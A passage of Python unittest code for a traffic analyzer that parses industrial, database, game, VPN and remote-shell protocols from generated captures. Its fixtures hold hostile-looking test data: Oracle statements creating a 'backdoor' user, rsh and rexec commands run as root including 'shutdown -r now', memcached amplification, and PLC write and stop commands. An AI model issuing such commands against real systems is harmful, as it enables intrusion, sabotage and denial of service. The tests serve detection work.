+        os.makedirs(d)
+        shutil.copy(self.pcap, d)
+        events_db = os.path.join(d, 'events.db')
+        db.create_sqlite_db(events_db, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data',
+                                                    'tacacs_fixture.eve.json'))
+        self.assertTrue(shark_analyzer.build(d, os.path.join(d, 'tacacs.pcap')))
+        shark_analyzer.merge(d)
+        counts = db.get_event_types_sqlite(events_db)
+        self.assertEqual(counts.get('tacacs'), 7)
+        self.assertNotIn('conn_tacplus', counts, 'records, not a connection card')
+
+
+@unittest.skipUnless(HAS_TSHARK, 'tshark not installed')
+class TestRakNet(unittest.TestCase):
+    """tests/protocol_fixtures.write_raknet_pcap: one record per RakNet
+    flow - with what Suricata 8.0.8 logged for the capture
+    (tests/data/raknet_fixture.eve.json): flows it gives no protocol."""
+
+    @classmethod
+    def setUpClass(cls):
+        from tests.protocol_fixtures import write_raknet_pcap
+        cls.tmpdir = tempfile.mkdtemp()
+        cls.pcap = os.path.join(cls.tmpdir, 'raknet.pcap')
+        write_raknet_pcap(cls.pcap)
+        cls.records = shark_analyzer.run_tshark(cls.pcap)
+        cls.flows = {r['src_port']: r['raknet'] for r in cls.records if r['event_type'] == 'raknet'}
+
+    @classmethod
+    def tearDownClass(cls):
+        shutil.rmtree(cls.tmpdir, ignore_errors=True)
+
+    def test_a_game_server_and_a_connection(self):
+        from tests.protocol_fixtures import RAKNET_ADVERTISEMENT
+        f = self.flows[41980]
+        self.assertEqual({k: f.get(k) for k in ('edition', 'motd', 'game_version', 'protocol', 'players', 'max_players',
+                                                'level', 'gamemode', 'advertisement', 'answered', 'connected', 'mtu',
+                                                'protocol_version', 'client_guid', 'server_guid', 'datagrams_to_server',
+                                                'datagrams_to_client')},
+                         {'edition': 'MCPE', 'motd': 'Lab Server', 'game_version': '1.21.20', 'protocol': 712, 'players': 3,
+                          'max_players': 10, 'level': 'Bedrock level', 'gamemode': 'Survival',
+                          'advertisement': RAKNET_ADVERTISEMENT, 'answered': True, 'connected': True, 'mtu': 1464,
+                          'protocol_version': 11, 'client_guid': '1122334455667788', 'server_guid': 'a1a2a3a4a5a6a7a8',
+                          'datagrams_to_server': 2, 'datagrams_to_client': 2})
+
+    def test_a_scanner_and_random_bytes(self):
+        self.assertEqual(self.flows[41990], {'messages': {'Unconnected Ping': 1}, 'answered': False,
+                                             'client_guid': '0000000000000000'})
+        self.assertNotIn(58787, self.flows, "random bytes to 19132 lack RakNet's magic")
+
+    def test_the_merge_adds_the_records(self):
+        from scripts.compare_shark_suricata import compare
+        report = compare(_load_eve('raknet_fixture.eve.json'), self.records)['flow']
+        self.assertEqual((report['matched'], report['differences']), (3, []))
+        d = os.path.join(self.tmpdir, 'analysis')
+        os.makedirs(d)
+        shutil.copy(self.pcap, d)
+        events_db = os.path.join(d, 'events.db')
+        db.create_sqlite_db(events_db, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data',
+                                                    'raknet_fixture.eve.json'))
+        self.assertTrue(shark_analyzer.build(d, os.path.join(d, 'raknet.pcap')))
+        shark_analyzer.merge(d)
+        counts = db.get_event_types_sqlite(events_db)
+        self.assertEqual(counts.get('raknet'), 2)
+        self.assertNotIn('conn_raknet', counts, 'records, not a connection card')
+
+
+@unittest.skipUnless(HAS_TSHARK, 'tshark not installed')
+class TestFINS(unittest.TestCase):
+    """tests/protocol_fixtures.write_fins_pcap: one record per Omron FINS
+    connection or exchange and per command that changes or controls the
+    PLC - with what Suricata 8.0.8 logged for the capture
+    (tests/data/fins_fixture.eve.json): flows it gives no protocol."""
+
+    @classmethod
+    def setUpClass(cls):
+        from tests.protocol_fixtures import write_fins_pcap
+        cls.tmpdir = tempfile.mkdtemp()
+        cls.pcap = os.path.join(cls.tmpdir, 'fins.pcap')
+        write_fins_pcap(cls.pcap)
+        cls.records = shark_analyzer.run_tshark(cls.pcap)
+        cls.connections = {r['src_port']: r['fins'] for r in cls.records if r['event_type'] == 'fins'}
+        cls.actions = {r['fins_action']['command']: r['fins_action'] for r in cls.records if r['event_type'] == 'fins_action'}
+
+    @classmethod
+    def tearDownClass(cls):
+        shutil.rmtree(cls.tmpdir, ignore_errors=True)
+
+    def test_a_station_and_its_plc(self):
+        c = self.connections[9600]
+        self.assertEqual({k: c.get(k) for k in ('model', 'version', 'node', 'source_node', 'answered', 'errors')},
+                         {'model': 'CJ2M-CPU31', 'version': '02.01', 'node': 1, 'source_node': 10, 'answered': True,
+                          'errors': {'The mode is wrong (executing)': 1, 'An incorrect password has been specified': 1}})
+        self.assertEqual(c['commands']['Memory Area Read'], 1, 'reads are counted, not recorded')
+
+    def test_actions(self):
+        self.assertEqual(self.actions['Memory Area Write'],
+                         {'command': 'Memory Area Write', 'code': '0x0102', 'area': 'DM : Word contents', 'address': '0x0064',
+                          'count': 2, 'data': 'ffff0001', 'node': 1, 'result': 'ok'})
+        self.assertEqual((self.actions['Run']['mode'], self.actions['Run']['result']), ('MONITOR mode', 'ok'))
+        self.assertEqual(self.actions['Stop']['result'], 'The mode is wrong (executing)')
+        self.assertEqual((self.actions['Program Area Protect Clear']['password'], self.actions['Program Area Protect Clear']['result']),
+                         ('1234', 'An incorrect password has been specified'))
+        self.assertNotIn('Memory Area Read', self.actions)
+
+    def test_fins_tcp_and_a_scanner(self):
+        self.assertEqual({k: self.connections[41900].get(k) for k in ('client_node', 'server_node', 'commands')},
+                         {'client_node': 11, 'server_node': 1, 'commands': {'Forced Set/Reset': 1}})
+        self.assertEqual(self.actions['Forced Set/Reset']['result'], 'ok')
+        self.assertEqual({k: self.connections[41950].get(k) for k in ('answered', 'source_node')},
+                         {'answered': False, 'source_node': 99})
+
+    def test_the_merge_adds_the_records(self):
+        from scripts.compare_shark_suricata import compare
+        report = compare(_load_eve('fins_fixture.eve.json'), self.records)['flow']
+        self.assertEqual((report['matched'], report['differences']), (3, []))
+        d = os.path.join(self.tmpdir, 'analysis')
+        os.makedirs(d)
+        shutil.copy(self.pcap, d)
+        events_db = os.path.join(d, 'events.db')
+        db.create_sqlite_db(events_db, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data',
+                                                    'fins_fixture.eve.json'))
+        self.assertTrue(shark_analyzer.build(d, os.path.join(d, 'fins.pcap')))
+        shark_analyzer.merge(d)
+        counts = db.get_event_types_sqlite(events_db)
+        self.assertEqual((counts.get('fins'), counts.get('fins_action')), (3, 5))
+        self.assertNotIn('conn_omron', counts, 'records, not a connection card')
+
+
+@unittest.skipUnless(HAS_TSHARK, 'tshark not installed')
+class TestHARTIP(unittest.TestCase):
+    """tests/protocol_fixtures.write_hart_ip_pcap: one record per HART-IP
+    session and per command that changes or commands a device - with what
+    Suricata 8.0.8 logged for the capture (tests/data/hart_ip_fixture.eve.json):
+    flows it gives no protocol."""
+
+    @classmethod
+    def setUpClass(cls):
+        from tests.protocol_fixtures import write_hart_ip_pcap
+        cls.tmpdir = tempfile.mkdtemp()
+        cls.pcap = os.path.join(cls.tmpdir, 'hart_ip.pcap')
+        write_hart_ip_pcap(cls.pcap)
+        cls.records = shark_analyzer.run_tshark(cls.pcap)
+        cls.sessions = {r['src_port']: r['hart_ip'] for r in cls.records if r['event_type'] == 'hart_ip'}
+        cls.actions = {r['hart_ip_action']['number']: r['hart_ip_action'] for r in cls.records
+                       if r['event_type'] == 'hart_ip_action'}
+
+    @classmethod
+    def tearDownClass(cls):
+        shutil.rmtree(cls.tmpdir, ignore_errors=True)
+
+    def test_a_session_and_its_device(self):
+        s = self.sessions[41960]
+        self.assertEqual({k: s.get(k) for k in ('host_type', 'session', 'answered', 'errors', 'tags')},
+                         {'host_type': 'primary master', 'session': 'accepted', 'answered': True,
+                          'errors': {'access restricted': 1}, 'tags': ['PT-1O1']})
+        self.assertEqual(s['devices'], [{'address': '264e0000d2', 'manufacturer_id': 38, 'device_type': '0x264e',
+                                         'device_id': '0000d2', 'device_revision': 4, 'software_revision': 1,
+                                         'config_changes': 2, 'tag': 'PT-1O1', 'descriptor': 'PRESSURE', 'pv': 4.25}],
+                         'one device - asked by polling address, then by long address with the master bit')
+
+    def test_actions(self):
+        self.assertEqual(self.actions, {
+            18: {'command': 'Write Tag, Descriptor, Date', 'number': 18, 'device': '264e0000d2', 'data': 'tag PT-1O1',
+                 'result': 'success'},
+            40: {'command': 'Enter/Exit Fixed Current Mode', 'number': 40, 'device': '264e0000d2', 'data': '20 mA',
+                 'result': 'success'},
+            42: {'command': 'Perform Device Reset', 'number': 42, 'device': '264e0000d2', 'result': 'access restricted'}})
+
+    def test_scanners(self):
+        self.assertEqual((self.sessions[41970]['session'], self.sessions[41970]['answered']), ('requested', False))
+        self.assertNotIn(23318, self.sessions, "a scanner's text template isn't HART-IP")
+
+    def test_the_merge_adds_the_records(self):
+        from scripts.compare_shark_suricata import compare
+        report = compare(_load_eve('hart_ip_fixture.eve.json'), self.records)['flow']
+        self.assertEqual((report['matched'], report['differences']), (3, []))
+        d = os.path.join(self.tmpdir, 'analysis')
+        os.makedirs(d)
+        shutil.copy(self.pcap, d)
+        events_db = os.path.join(d, 'events.db')
+        db.create_sqlite_db(events_db, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data',
+                                                    'hart_ip_fixture.eve.json'))
+        self.assertTrue(shark_analyzer.build(d, os.path.join(d, 'hart_ip.pcap')))
+        shark_analyzer.merge(d)
+        counts = db.get_event_types_sqlite(events_db)
+        self.assertEqual((counts.get('hart_ip'), counts.get('hart_ip_action')), (2, 3))
+        self.assertNotIn('conn_hart_ip', counts, 'records, not a connection card')
+
+    def test_a_udp_session_a_gateway_moved_to_another_port(self):
+        """A gateway can answer a UDP Session Initiate from a port of its
+        own and go on there - one session, on the initiate's flow."""
+        from tests.pcap_fixtures import write_pcap
+        from tests.protocol_fixtures import _hart_ip, _udp_packet
+        host, gateway = '10.1.0.90', '10.1.0.91'
+        packets = [_udp_packet(host, gateway, 42000, 5094, _hart_ip(0, 0, 1, b'\x01\x00\x00\xea\x60')),
+                   _udp_packet(gateway, host, 5095, 42000, _hart_ip(1, 0, 1, b'\x01\x00\x00\xea\x60')),
+                   _udp_packet(host, gateway, 42000, 5095, _hart_ip(0, 2, 2)),
+                   _udp_packet(gateway, host, 5095, 42000, _hart_ip(1, 2, 2))]
+        pcap = os.path.join(self.tmpdir, 'moved.pcap')
+        write_pcap(pcap, packets)
+        sessions = [r for r in shark_analyzer.run_tshark(pcap) if r['event_type'] == 'hart_ip']
+        self.assertEqual([(r['src_port'], r['dest_port'], r['hart_ip']['session'], r['hart_ip']['commands'],
+                           r['hart_ip']['moved_to_port']) for r in sessions],
+                         [(42000, 5094, 'accepted', {'Session Initiate': 1, 'Keep Alive': 1}, 5095)])
+
+
+@unittest.skipUnless(HAS_TSHARK, 'tshark not installed')
+class TestMemcache(unittest.TestCase):
+    """tests/protocol_fixtures.write_memcache_pcap: one record per
+    memcached connection or UDP exchange - with what Suricata 8.0.8 logged
+    for the capture (tests/data/memcache_fixture.eve.json): flows it gives
+    no protocol."""
+
+    @classmethod
+    def setUpClass(cls):
+        from tests.protocol_fixtures import write_memcache_pcap
+        cls.tmpdir = tempfile.mkdtemp()
+        cls.pcap = os.path.join(cls.tmpdir, 'memcache.pcap')
+        write_memcache_pcap(cls.pcap)
+        cls.records = shark_analyzer.run_tshark(cls.pcap)
+        cls.exchanges = {r['src_port']: r['memcache'] for r in cls.records if r['event_type'] == 'memcache'}
+
+    @classmethod
+    def tearDownClass(cls):
+        shutil.rmtree(cls.tmpdir, ignore_errors=True)
+
+    def test_a_text_session(self):
+        self.assertEqual(self.exchanges[41600], {
+            'commands': {'version': 1, 'set': 1, 'get': 1, 'incr': 2, 'add': 1, 'delete': 1, 'flush_all': 1},
+            'keys': ['session:4711', 'hits'], 'encoding': 'text', 'answered': True, 'version': '1.6.38',
+            'not_found': 1, 'unknown': 1, 'errors': 1, 'last_error': 'ERROR', 'changes': 6,
+            'request_bytes': 157, 'response_bytes': 114})
+
+    def test_a_stored_value_is_never_read_as_commands(self):
+        self.assertEqual(self.exchanges[41601]['commands'], {'set': 1}, 'its lines say flush_all and shutdown')
+
+    def test_stats_and_the_binary_protocol(self):
+        self.assertEqual({k: self.exchanges[41602].get(k) for k in ('commands', 'stats', 'version', 'answered')},
+                         {'commands': {'stats': 1}, 'stats': ['stats'], 'version': '1.6.38', 'answered': True})
+        self.assertEqual({k: self.exchanges[41603].get(k) for k in ('commands', 'keys', 'encoding', 'version', 'not_found')},
+                         {'commands': {'version': 1, 'set': 1, 'get': 1}, 'keys': ['bin:key', 'nope'],
+                          'encoding': 'binary', 'version': '1.6.38', 'not_found': 1})
+
+    def test_udp_amplification_and_probes(self):
+        reflected = self.exchanges[41700]
+        self.assertEqual((reflected['stats'], reflected['request_bytes'], reflected['amplification']),
+                         (['stats items'], 21, round(reflected['response_bytes'] / 21, 1)))
+        self.assertGreater(reflected['amplification'], 500, 'three datagrams back for one')
+        self.assertEqual((self.exchanges[41800]['answered'], 'amplification' in self.exchanges[41800]), (False, False))
+        self.assertNotIn(41801, self.exchanges, 'random bytes to the port')
+        self.assertNotIn(11211, self.exchanges, "random bytes from it, which start like incr's answer")
+
+    def test_the_merge_adds_the_records(self):
+        from scripts.compare_shark_suricata import compare
+        report = compare(_load_eve('memcache_fixture.eve.json'), self.records)['flow']
+        self.assertEqual((report['matched'], report['differences']), (8, []))
+        d = os.path.join(self.tmpdir, 'analysis')
+        os.makedirs(d)
+        shutil.copy(self.pcap, d)
+        events_db = os.path.join(d, 'events.db')
+        db.create_sqlite_db(events_db, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data',
+                                                    'memcache_fixture.eve.json'))
+        self.assertTrue(shark_analyzer.build(d, os.path.join(d, 'memcache.pcap')))
+        shark_analyzer.merge(d)
+        counts = db.get_event_types_sqlite(events_db)
+        self.assertEqual(counts.get('memcache'), 6)
+        self.assertNotIn('conn_memcache', counts, 'records, not a connection card')
+        self.assertNotIn(db.PROBED_CONNECTION_TYPE, counts, 'nor are the random bytes a probe')
+
+
+@unittest.skipUnless(HAS_TSHARK, 'tshark not installed')
+class TestTNS(unittest.TestCase):
+    """tests/protocol_fixtures.write_tns_pcap: one record per Oracle TNS
+    connection and per distinct statement - with what Suricata 8.0.8
+    logged for the capture (tests/data/tns_fixture.eve.json): flows it
+    gives no protocol."""
+
+    @classmethod
+    def setUpClass(cls):
+        from tests.protocol_fixtures import write_tns_pcap
+        cls.tmpdir = tempfile.mkdtemp()
+        cls.pcap = os.path.join(cls.tmpdir, 'tns.pcap')
+        write_tns_pcap(cls.pcap)
+        cls.records = shark_analyzer.run_tshark(cls.pcap)
+        cls.connections = {r['src_port']: r['tns'] for r in cls.records if r['event_type'] == 'tns'}
+        cls.statements = {r['tns_statement']['statement']: r['tns_statement'] for r in cls.records
+                          if r['event_type'] == 'tns_statement'}
+
+    @classmethod
+    def tearDownClass(cls):
+        shutil.rmtree(cls.tmpdir, ignore_errors=True)
+
+    def test_a_login_and_its_session(self):
+        c = self.connections[41500]
+        self.assertEqual({k: c.get(k) for k in ('service_name', 'client_program', 'client_host', 'client_user', 'result',
+                                                'db_user', 'login', 'program', 'machine', 'os_user', 'database',
+                                                'instance', 'server_host', 'statements', 'errors')},
+                         {'service_name': 'FIXDB', 'client_program': 'sqlplus@attacker', 'client_host': 'attacker',
+                          'client_user': 'mallory', 'result': 'accepted', 'db_user': 'sys', 'login': 'succeeded',
+                          'program': 'sqlplus@attacker (TNS V1-V3)', 'machine': 'attacker', 'os_user': 'mallory',
+                          'database': 'FIXDB', 'instance': 'fixdb1', 'server_host': 'dbhost', 'statements': 7,
+                          'errors': {'ORA-00942': 1}},
+                         "the CID's host, not the ADDRESS's; no data found isn't an error")
+
+    def test_statements(self):
+        from tests.protocol_fixtures import TNS_LONG_QUERY
+        self.assertEqual(self.statements['create user backdoor identified by ***'],
+                         {'statement': 'create user backdoor identified by ***', 'verb': 'CREATE USER', 'count': 1,
+                          'password': 'S3cret!', 'result': 'ok', 'db_user': 'sys', 'service_name': 'FIXDB'})
+        self.assertEqual((self.statements['SELECT * FROM payroll']['count'],
+                          self.statements['SELECT * FROM payroll']['result']), (2, 'ok'), 'one record, counted')
+        self.assertEqual(self.statements[TNS_LONG_QUERY]['result'], 'ORA-00942: table or view does not exist',
+                         'a long statement, sent in chunks')
+        self.assertEqual({s['verb'] for s in self.statements.values()},
+                         {'CREATE USER', 'GRANT', 'SELECT', 'DROP TABLE', 'INSERT'})
+
+    def test_a_failed_login(self):
+        c = self.connections[41501]
+        self.assertEqual((c['db_user'], c['login'], c['login_error'], c['statements']),
+                         ('system', 'failed', 'ORA-01017: invalid username/password; logon denied', 0))
+
+    def test_the_listener_refusing_redirecting_and_answering_a_command(self):
+        self.assertEqual({k: self.connections[41502].get(k) for k in ('sid', 'result', 'error', 'listener_version')},
+                         {'sid': 'ORCLX', 'result': 'refused', 'error': 'ORA-12505', 'listener_version': '9.2.0.1.0'})
+        self.assertEqual({k: self.connections[41503].get(k) for k in ('command', 'result', 'listener_version')},
+                         {'command': 'version', 'result': 'answered', 'listener_version': '19.0.0.0.0'})
+        self.assertEqual((self.connections[41504]['result'], self.connections[41504]['redirect']),
+                         ('redirected', '(ADDRESS=(PROTOCOL=tcp)(HOST=198.51.100.96)(PORT=40123))'))
+
+    def test_the_merge_adds_the_records(self):
+        from scripts.compare_shark_suricata import compare
+        report = compare(_load_eve('tns_fixture.eve.json'), self.records)['flow']
+        self.assertEqual((report['matched'], report['differences']), (5, []))
+        d = os.path.join(self.tmpdir, 'analysis')
+        os.makedirs(d)
+        shutil.copy(self.pcap, d)
+        events_db = os.path.join(d, 'events.db')
+        db.create_sqlite_db(events_db, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data',
+                                                    'tns_fixture.eve.json'))
+        self.assertTrue(shark_analyzer.build(d, os.path.join(d, 'tns.pcap')))
+        shark_analyzer.merge(d)
+        counts = db.get_event_types_sqlite(events_db)
+        self.assertEqual((counts.get('tns'), counts.get('tns_statement')), (5, 6))
+        self.assertNotIn('conn_tns', counts, 'records, not a connection card')
+
+
+class TestTNSMessages(unittest.TestCase):
+    """shark_protocols' readers of TNS messages' bytes, on the shapes
+    Wireshark's sample captures showed."""
+
+    def test_a_statement_whose_length_counts_its_nul(self):
+        from shark_protocols import _tns_sql
+        self.assertEqual(_tns_sql(b'\x03\x5e\x06a\x80' + b'\x16SELECT USER FROM DUAL\x00\x01\x00'),
+                         'SELECT USER FROM DUAL')
+
+    def test_banner_text_is_not_a_statement(self):
+        from shark_protocols import _tns_sql
+        self.assertIsNone(_tns_sql(b'\x08z\x00\x1aWith the Partitioning, OLAP'))
+
+    def test_a_statement_sent_without_its_length_before_it(self):
+        """Newer clients give its length earlier in the call - and a letter
+        inside it ('R' is 82) mustn't pass for a length, which would make
+        a fragment of it a statement."""
+        from shark_protocols import _tns_sql
+        sql = b"DECLARE c1 SYS_REFCURSOR; BEGIN OPEN c1 FOR SELECT 1 A FROM DUAL; DBMS_SQL.RETURN_RESULT(c1); END;"
+        self.assertEqual(_tns_sql(b'\x03\x5e\x07' + b'\x00' * 9 + sql + b'\x01\x01\x00\x00'), sql.decode())
+        self.assertEqual(_tns_sql(b'\x00\x00UPDATE T SET S = :1 WHERE ID > :2\x01\x00'), 'UPDATE T SET S = :1 WHERE ID > :2')
+
+    def test_a_login_key_followed_by_a_letter(self):
+        """REGRESSION GUARD: 11g's AUTH_PROGRAM_NM is followed by 0x48 - an
+        H - which a pattern alone reads as part of the name."""
+        from shark_protocols import _tns_login
+        data = (b'\x03sys\x27\x00\x00\x00\x0dAUTH_TERMINAL\x0f\x00\x00\x00\x05pts/0\x00\x00\x00\x00'
+                b'\x2d\x00\x00\x00\x0fAUTH_PROGRAM_NMH\x00\x00\x00\x18sqlplus@kali (TNS V1-V3)\x00\x00\x00\x00')
+        self.assertEqual(_tns_login(data), ('sys', {'AUTH_TERMINAL': 'pts/0',
+                                                    'AUTH_PROGRAM_NM': 'sqlplus@kali (TNS V1-V3)'}))
+
+    def test_verbs(self):
+        from shark_protocols import _tns_verb
+        self.assertEqual([_tns_verb(s) for s in ('create or replace procedure p as begin null; end;',
+                                                 'drop public synonym x', 'alter session set nls_date_format = x',
+                                                 'grant dba to x', 'truncate table t')],
+                         ['CREATE OR REPLACE PROCEDURE', 'DROP PUBLIC SYNONYM', 'ALTER SESSION', 'GRANT', 'TRUNCATE TABLE'])
+
+
+@unittest.skipUnless(HAS_TSHARK, 'tshark not installed')
+class TestWireGuard(unittest.TestCase):
+    """tests/protocol_fixtures.write_wireguard_pcap: one record per
+    WireGuard connection - with what Suricata 8.0.8 logged for the capture
+    (tests/data/wireguard_fixture.eve.json): flows it gives no protocol."""
+
+    @classmethod
+    def setUpClass(cls):
+        from tests.protocol_fixtures import write_wireguard_pcap
+        cls.tmpdir = tempfile.mkdtemp()
+        cls.pcap = os.path.join(cls.tmpdir, 'wireguard.pcap')
+        write_wireguard_pcap(cls.pcap)
+        cls.records = shark_analyzer.run_tshark(cls.pcap)
+        cls.sessions = {r['src_port']: r['wireguard'] for r in cls.records if r['event_type'] == 'wireguard'}
+
+    @classmethod
+    def tearDownClass(cls):
+        shutil.rmtree(cls.tmpdir, ignore_errors=True)
+
+    def test_an_established_tunnel_rekeyed_by_either_peer(self):
+        self.assertEqual(self.sessions[40700], {'stage': 'established', 'initiations': 2, 'handshakes': 2,
+                                                'unanswered': 0, 'both_initiated': True, 'data_to_server': 2,
+                                                'data_to_client': 2, 'keepalives': 1})
+
+    def test_a_peer_retrying_unanswered(self):
+        self.assertEqual(self.sessions[40800], {'stage': 'initiation only', 'initiations': 3, 'handshakes': 0,
+                                                'unanswered': 3, 'data_to_server': 0, 'data_to_client': 0})
+
+    def test_a_tunnel_up_before_the_capture_and_a_stray_packet(self):
+        self.assertEqual(self.sessions[40900]['stage'], 'established', 'data each way, each to one receiver index')
+        self.assertNotIn(41000, self.sessions, "one packet of data's shape isn't WireGuard")
+
+    def test_the_merge_adds_the_records(self):
+        from scripts.compare_shark_suricata import compare
+        report = compare(_load_eve('wireguard_fixture.eve.json'), self.records)['flow']
+        self.assertEqual((report['matched'], report['differences']), (4, []))
+        d = os.path.join(self.tmpdir, 'analysis')
+        os.makedirs(d)
+        shutil.copy(self.pcap, d)
+        events_db = os.path.join(d, 'events.db')
+        db.create_sqlite_db(events_db, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data',
+                                                    'wireguard_fixture.eve.json'))
+        self.assertTrue(shark_analyzer.build(d, os.path.join(d, 'wireguard.pcap')))
+        shark_analyzer.merge(d)
+        counts = db.get_event_types_sqlite(events_db)
+        self.assertEqual(counts.get('wireguard'), 3)
+        self.assertNotIn('conn_wg', counts, 'records, not a connection card - and none for the stray packet')
+
+
+class TestDecryptedWireGuard(unittest.TestCase):
+    """WireGuard that tshark decrypts (a pcapng carrying the keys) is a
+    tunnel: the packets inside are flows of their own, and each is a
+    message of the outer connection's record too - from the first pass's
+    lines (the combined pass) or the protocol pass's."""
+
+    OUTER = ('10.9.0.1', '10.9.0.2', 43462, 51820)
+
+    @classmethod
+    def _line(cls, fields, frame, reply, receiver):
+        src, dst, sport, dport = cls.OUTER
+        inner = ('10.10.0.2', '10.10.0.1')
+        if reply:
+            src, dst, sport, dport, inner = dst, src, dport, sport, inner[::-1]
+        a = shark_analyzer._AGGREGATOR
+        c = dict.fromkeys(fields, '')
+        c.update({'frame.time_epoch': str(1.0 + frame / 10), 'frame.len': '130', 'frame.number': str(frame),
+                  'frame.protocols': 'eth:ethertype:ip:udp:wg:ip:icmp:data', 'ip.src': a.join((src, inner[0])),
+                  'ip.dst': a.join((dst, inner[1])), 'ip.proto': a.join(('17', '1')), 'ip.len': a.join(('116', '84')),
+                  'udp.srcport': str(sport), 'udp.dstport': str(dport), 'udp.stream': '0', 'wg.type': '4',
+                  'wg.receiver': receiver})
+        return '\t'.join(c[f] for f in fields)
+
+    def _lines(self, fields):
+        return [self._line(fields, n, n % 2 == 0, '0xcd' if n % 2 == 0 else '0xab') for n in range(1, 5)]
+
+    def test_from_the_combined_pass(self):
+        from shark_protocols import WireGuard
+        records = list(shark_analyzer.iter_records(self._lines(shark_analyzer._combined_fields((WireGuard,))),
+                                                   combined=(WireGuard,)))
+        types = sorted(r['event_type'] for r in records)
+        self.assertEqual(types, ['flow', 'flow', 'tunnel', 'wireguard'])
+        wg = next(r for r in records if r['event_type'] == 'wireguard')
+        self.assertEqual((wg['src_ip'], wg['wireguard']['data_to_server'], wg['wireguard']['data_to_client']),
+                         ('10.9.0.1', 2, 2))
+        inner = next(r for r in records if r['event_type'] == 'flow' and r['src_ip'] == '10.10.0.2')
+        self.assertEqual(inner['app_proto'], 'icmp', 'the packets inside are their own flow')
+
+    def test_from_the_protocol_pass(self):
+        from shark_protocols import WireGuard
+        src, dst, sport, dport = self.OUTER
+        flow = shark_analyzer._Flow(('udp', 0), 'UDP', 4, src, dst, sport, dport, 1.0, 0)
+        index = {('UDP', frozenset(((src, sport), (dst, dport)))): [flow]}
+        fields = shark_analyzer._protocol_pass_fields([WireGuard])
+        handler = WireGuard()
+        feeds = [(handler, [fields.index(f) for f in WireGuard.fields])]
+        for line in self._lines(fields):
+            shark_analyzer._feed_protocols(line.split('\t'), index, feeds)
+        [(_, _, _, body)] = handler.finish()
+        self.assertEqual((body['data_to_server'], body['data_to_client']), (2, 2))
+
+
+@unittest.skipUnless(HAS_TSHARK, 'tshark not installed')
+class TestOpenVPN(unittest.TestCase):
+    """tests/protocol_fixtures.write_openvpn_pcap: one record per OpenVPN
+    connection - with what Suricata 8.0.8 logged for the capture
+    (tests/data/openvpn_fixture.eve.json): flows it gives no protocol."""
+
+    @classmethod
+    def setUpClass(cls):
+        from tests.protocol_fixtures import write_openvpn_pcap
+        cls.tmpdir = tempfile.mkdtemp()
+        cls.pcap = os.path.join(cls.tmpdir, 'openvpn.pcap')
+        write_openvpn_pcap(cls.pcap)
+        cls.records = shark_analyzer.run_tshark(cls.pcap)
+        cls.sessions = {r['src_port']: r['openvpn'] for r in cls.records if r['event_type'] == 'openvpn'}
+
+    @classmethod
+    def tearDownClass(cls):
+        shutil.rmtree(cls.tmpdir, ignore_errors=True)
+
+    def test_an_established_tunnel(self):
+        s = self.sessions[40500]
+        self.assertEqual({k: s.get(k) for k in ('stage', 'version', 'control_protection', 'client_resets', 'sni',
+                                                'cipher_suite', 'data_to_server', 'data_to_client', 'data_keys')},
+                         {'stage': 'established', 'version': 'V2', 'control_protection': 'none', 'client_resets': 1,
+                          'sni': 'vpn.example', 'cipher_suite': 'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
+                          'data_to_server': 2, 'data_to_client': 2, 'data_keys': 2})
+        self.assertEqual((s['certificate']['subject'], s['certificate']['issuerdn']),
+                         ('C=US, O=Fixture Ltd, CN=dtls.example', 'C=US, O=Fixture Ltd, CN=dtls.example'),
+                         "the server's certificate, from the TLS inside the control channel")
+        self.assertNotIn('client_certificate', s)
+
+    def test_a_client_retrying_unanswered(self):
+        self.assertEqual(self.sessions[40600], {'stage': 'client reset only', 'version': 'V2', 'client_resets': 3,
+                                                'client_sessions': 3, 'data_to_server': 0, 'data_to_client': 0})
+
+    def test_the_merge_adds_the_records(self):
+        from scripts.compare_shark_suricata import compare
+        report = compare(_load_eve('openvpn_fixture.eve.json'), self.records)['flow']
+        self.assertEqual((report['matched'], report['named_by_tshark'], report['differences']), (2, 2, []))
+        d = os.path.join(self.tmpdir, 'analysis')
+        os.makedirs(d)
+        shutil.copy(self.pcap, d)
+        events_db = os.path.join(d, 'events.db')
+        db.create_sqlite_db(events_db, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data',
+                                                    'openvpn_fixture.eve.json'))
+        self.assertTrue(shark_analyzer.build(d, os.path.join(d, 'openvpn.pcap')))
+        shark_analyzer.merge(d)
+        counts = db.get_event_types_sqlite(events_db)
+        self.assertEqual(counts.get('openvpn'), 2)
+        self.assertNotIn('conn_openvpn', counts, 'records, not a connection card')
+
+
+@unittest.skipUnless(HAS_TSHARK, 'tshark not installed')
+class TestRShell(unittest.TestCase):
+    """tests/protocol_fixtures.write_rsh_pcap: one record per rsh, rlogin
+    or rexec connection - with what Suricata 8.0.8 logged for the capture
+    (tests/data/rsh_fixture.eve.json): flows it gives no protocol, and the
+    scanner's probe, which it names HTTP by its content."""
+
+    @classmethod
+    def setUpClass(cls):
+        from tests.protocol_fixtures import write_rsh_pcap
+        cls.tmpdir = tempfile.mkdtemp()
+        cls.pcap = os.path.join(cls.tmpdir, 'rsh.pcap')
+        write_rsh_pcap(cls.pcap)
+        cls.records = shark_analyzer.run_tshark(cls.pcap)
+        cls.sessions = {r['src_port']: r['rsh'] for r in cls.records if r['event_type'] == 'rsh'}
+
+    @classmethod
+    def tearDownClass(cls):
+        shutil.rmtree(cls.tmpdir, ignore_errors=True)
+
+    def test_rsh_with_its_output(self):
+        self.assertEqual(self.sessions[1022], {
+            'service': 'rsh', 'local_user': 'alice', 'user': 'root', 'command': 'id; uname -a', 'result': 'accepted',
+            'output': 'uid=0(root) gid=0(root) groups=0(root) Linux plc 5.10.0'})
+
+    def test_rexec_refused(self):
+        self.assertEqual(self.sessions[1023], {
+            'service': 'rexec', 'user': 'operator', 'password': 's3cret', 'command': 'shutdown -r now',
+            'result': 'refused', 'error': 'Login incorrect.'})
+
+    def test_rlogin_read_like_telnet(self):
+        self.assertEqual(self.sessions[1021], {
+            'service': 'rlogin', 'local_user': 'bob', 'user': 'bob', 'terminal': 'xterm/38400', 'result': 'accepted',
+            'password': 'hunter2', 'commands': ['ls', 'exit']})
+
+    def test_a_probe_and_its_answer(self):
